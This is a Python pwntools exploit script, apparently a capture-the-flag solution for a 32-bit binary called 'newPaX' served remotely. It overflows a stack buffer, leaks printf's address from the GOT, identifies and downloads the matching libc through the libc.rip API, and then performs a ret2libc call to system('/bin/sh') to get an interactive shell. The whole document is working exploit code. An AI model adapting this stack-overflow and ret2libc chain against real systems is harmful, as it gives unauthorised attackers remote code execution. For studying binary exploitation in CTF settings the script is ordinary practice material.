#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./newPaX')
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	libc = binary.libc
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	libc_index = 5
	p = remote('newpax.darkarmy.xyz', 5001)

payload  = 0x34 * b'A'
payload += p32(binary.plt.printf)
payload += p32(binary.sym.vuln)
payload += p32(binary.got.printf)

p.send(payload)
_ = p.recv(4)
printf = u32(_)
log.info('printf: ' + hex(printf))
p.recv(20)

if not 'libc' in locals():
	try:
		import requests
		r = requests.post('https://libc.rip/api/find', json = {'symbols':{'printf':hex(printf)[-3:]}})
		libc_url = r.json()[libc_index]['download_url']
		libc_file = libc_url.split('/')[-1:][0]
		if not os.path.exists(libc_file):
			log.info('getting: ' + libc_url)
			r = requests.get(libc_url, allow_redirects=True)
			open(libc_file,'wb').write(r.content)
	except:
		log.critical('get libc yourself!')
		sys.exit(0)
	libc = ELF(libc_file)

libc.address = printf - libc.sym.printf
log.info('libc.address: ' + hex(libc.address))

payload  = 0x34 * b'A'
payload += p32(libc.sym.system)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())

p.send(payload)
p.interactive()

